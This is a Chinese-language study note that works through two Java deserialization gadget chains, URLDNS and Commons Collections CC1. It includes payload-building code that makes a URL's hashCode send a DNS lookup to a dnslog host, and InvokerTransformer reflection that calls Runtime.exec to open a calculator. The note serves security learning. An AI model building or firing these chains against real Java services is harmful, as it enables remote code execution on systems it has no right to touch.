                    # Java反序列化

                    # DNSURL

                    hashMap重写了readObject方法（为什么重写此方法），在hashMap反序列化的时需要调用key的hashCode方法对每个key做hash，因此只要传入的hashMap的key调用hashCode方法即可利用该链。URL类具有hashCode方法且当hashCode等于-1时调用getHostAddress发起DNS请求。

                    payload生成

                    1. new一个URL实例。为了生成payload时不发起DNSlog请求，需要将实例的hashCode的默认值-1改变。
                    URL url = new URL("http://87eaf5d9.dnslog.store");
Class<? extends URL> aClass = url.getClass();
Field hashCode = aClass.getDeclaredField("hashCode");
hashCode.setAccessible(true);
hashCode.set(url, 123);
SerializableTest(hashMap);

                    URL的hashCode方法如下所示：

                    public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
                    1. 将URL实例put到hashMap中。
                    hashMap.put(url, 9);
                    1. 将url的值改为默认值-1，当反序列化时需要调用实例的hashCode方法。
                    hashCode.set(url, -1);

                    hashMap的hash方法如下：

                    static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
                    1. 序列化hashMap生成payload
                    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
oos.writeObject(hashMap);

                    整体的调用链如下

                    hashMap.readObject
    hashMap.putVal
        hashMap.hash（每一个key都会调用自己的hashCode方法）
            URL.hashCode

                    # CC1

                    Commens Collections中的transform接口规定将一个对象转换成另一个对象，而InvokerTransformer中实现了transform接口，该方法实现可以调用任意方法，如下所示：

                    // 构造器
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();//获取输入的原型（可控）
        Method method = cls.getMethod(iMethodName, iParamTypes);//获取输入的方法（可控）
        return method.invoke(input, iArgs);//调用方法（可控）
    }
}

                    例如反射调用getRuntime的exec方法：

                    Class rt = Class.forName("java.lang.Runtime")
Method getRuntime = (Method) new InvokerTransformer(
        "getDeclaredMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", null}).transform(rt);
Runtime r = (Runtime) new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, null}).transform(getRuntime);
InvokerTransformer exec = new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"open -a Calculator.app"});
exec.transform(r);

                    继续向上找哪一个不同类的方法调用了transform方法。找到TransformedMap中checkSetValue方法调用了transform方法

                    protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}

                    虽然找到了调用transform的方法checkSetValue，但是该方法被protected修饰，只能在TransformedMap类中调用。valueTransformer调用了transform方法，继续在类中找与valueTransformer相关的方法，找到构造方法传入了valueTransformer，如下所示：

                    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}

                    构造方法被protected修饰，不能被外部实例化。但该类中decorate方法(public)做了实例化，如下所示：

                    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

                    这里虽然没有调用checkSetValue方法，但是传入了可控的参数。继续寻找调用checkSetValue的方法，只有一个类（AbstractInputCheckedMapDecorator的子类）调用了checkSetValue方法。

                    static class MapEntry extends AbstractMapEntryDecorator {

        /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}

                    其中Entry代表map中的一个键值对，Map中有setValue方法，在Map遍历时可以调用setValue方法。MapEntry继承了AbstractMapEntryDecorator重写了setValue方法，而这个类又Map.Entry接口，只要对被修饰的Map遍历就可以调用setValue方法进而调用checkValue方法。（有点迷）

                    继续寻找调用setValue的方法，发现AnnotationInvocationHanddler中的readObject调用了setValue方法，且方法内部对Map进行了遍历。

                    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                    value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}

                    其构造函数如下所示，memberValues是可以控制的Map。在readObject方法中遍历Map时要求Map的key不为空，即需要传入一个有参数的注解。

                    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }

                    由于此类是被default修饰，只能在同包下被访问，因此需要调用反射获取该类。

                    Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{Class.class, Map.class});
constructor.setAccessible(true);
Object o = constructor.newInstance(Retention.class, decorate);

                    至此，最终setValue的调用并不是Runtime.class，需要用ConstantTransformer将Runtime.class传入。
